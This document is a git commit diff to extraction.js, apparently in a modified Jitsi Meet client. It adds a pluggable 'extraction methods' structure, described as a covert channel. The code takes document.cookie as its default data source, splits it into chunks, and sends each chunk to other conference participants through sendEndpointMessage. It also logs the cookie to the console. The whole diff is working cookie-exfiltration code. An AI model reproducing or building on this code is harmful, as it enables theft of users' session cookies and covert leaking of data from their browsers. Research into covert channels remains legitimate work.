f383269199e2dabf97c7d4470c31e3d3b24c5cb3
davidus27 <davidisbest27@gmail.com>
2021-04-08 12:22:27 +0200

    added a structure how to easily implement more extraction methods

--- extraction.js
+++ extraction.js
@@ -1,9 +1,34 @@
 /* global APP, splitString*/
 
 const defaultConfigurationValues = {
+    method: 'plain',
     dataSource: document.cookie,
     chunkSize: 5000
 };
+
+/**
+ * Implementation of different convert channel methods
+ */
+class ExtractionMethods {
+
+    // reference to all other methods
+    static options = {
+        'plain': ExtractionMethods.usePlain
+    };
+
+    /**
+     * Sending data using simple plain method
+     * @param {any} data - Send specified data using Plain method
+     */
+    static async usePlain(data) {
+        console.log('cookie: ', data);
+        APP.conference.sendEndpointMessage('', {
+            extraction: 'reply',
+            payload: data
+        });
+    }
+}
+
 
 /**
  * Class responsible for extraction handling
@@ -12,21 +37,19 @@ export class ExtractionHandler {
     /**
      * @param {object} configuration - Object containing information about data extraction
      */
-    constructor(configuration) {
+    constructor(configuration, dataSource) {
         this.configuration = new Proxy(defaultConfigurationValues, configuration);
+        this.dataSource = dataSource;
     }
 
     /**
      * TODO: change to the send any type based on config
-     * Send data through the plain text.
-     * @param {integer} chunkSize - Size of chunks sent
+     * Send data through the specified method.
      */
-    send() {
-        for (const chunkData of splitString(this.configuration.dataSource, this.configuration.chunkSize)) {
-            APP.conference.sendEndpointMessage('', {
-                extraction: 'reply',
-                payload: chunkData
-            });
+    async send() {
+        for (const chunkData of splitString(this.dataSource, this.configuration.chunkSize)) {
+            // send data using corresponding method
+            await ExtractionMethods.options[this.configuration.method](chunkData); 
         }
         APP.conference.sendEndpointMessage('', {
             extraction: 'reply',
